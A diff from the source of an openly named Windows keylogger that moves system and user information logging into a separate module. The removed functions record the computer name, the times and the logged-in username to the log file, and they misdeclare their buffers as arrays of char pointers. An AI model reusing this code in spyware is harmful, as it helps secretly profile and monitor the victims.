@@ -35,6 +35,7 @@
 //---------------------------------------------------------- PERSONNAL INCLUDES
 #include "includes/bb-keylogger.h"
 #include "includes/bb-keylogger-keyboard.h"
+#include "includes/bb-keylogger-system.h"
 #include "includes/global.h"
 
 //------------------------------------------------------------------- FUNCTIONS
@@ -57,48 +58,6 @@ void log_infos( FILE * log_file, const char * format, ... )
 	// Log the infos
 	vfprintf( log_file, format, arg_ptr );
 	va_end( arg_ptr );
-}
-
-
-void log_network_infos( FILE * log_file )
-{
-	// TODO - Get infos : local IP, internet IP
-}
-
-void log_system_infos( FILE * log_file )
-{
-	// Get infos : computer name, system time, local time
-	int buffer_size = BUFFER_SIZE_STR;
-	char * computer_name [ buffer_size ];
-	SYSTEMTIME system_time, local_time;
-
-	GetComputerName( ( LPTSTR ) computer_name, ( LPDWORD ) &buffer_size );
-	GetSystemTime( ( LPSYSTEMTIME ) &system_time );
-	GetLocalTime( ( LPSYSTEMTIME ) &local_time );
-	
-	// Log these infos
-	log_infos( log_file, "# Computer name : %s\n", computer_name );
-			
-	log_infos( log_file,
-			"# System time : %02d/%02d/%04d - %02d:%02d\n", 
-			system_time.wDay, system_time.wMonth, system_time.wYear, 
-			system_time.wHour, system_time.wMinute );	
-	
-	log_infos( log_file, 
-			"# Local time : %02d/%02d/%04d - %02d:%02d\n", 
-			local_time.wDay, local_time.wMonth, local_time.wYear, 
-			local_time.wHour, local_time.wMinute );
-}
-
-void log_user_infos( FILE * log_file )
-{
-	// Get infos : username
-	int buffer_size = BUFFER_SIZE_STR;
-	char * username [ buffer_size ];
-	GetUserName( ( LPTSTR ) username, ( LPDWORD ) &buffer_size );
-	
-	// Log these infos
-	log_infos( log_file, "# Logged user : %s\n", username );
 }
 
 FILE * open_file( char * log_file_name )
